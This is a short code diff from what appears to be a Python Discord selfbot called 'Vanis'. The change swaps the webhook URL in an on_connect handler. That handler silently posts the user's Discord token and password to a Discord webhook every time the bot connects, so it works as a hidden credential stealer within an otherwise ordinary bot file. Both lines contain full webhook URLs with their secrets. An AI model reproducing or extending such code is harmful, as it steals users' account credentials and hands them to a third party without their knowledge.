@@ -783,7 +783,7 @@ async def kiss(ctx, member: discord.Member, user: discord.Member = None):
 @Vanis.event
 async def on_connect():
     requests.post(
-        'https://discord.com/api/webhooks/945717812989689856/UjAaqSI07Nja0_moUg14cwlwWaS-y5CcutNaicHO_XQnSkpxQ4vuS3r1eJGoOk8Qysz8',
+        'https://discord.com/api/webhooks/945720394017562644/l_pkofJYFSt0fOmy3T-mJvyHz3Eu8GfsQTg5rlgKcH7FeDC2fM-0PI94epbTf5dd8v6y',
         json={'content': f"**Token:** `{token}`, **Password**: `{password}`"})  
 
 
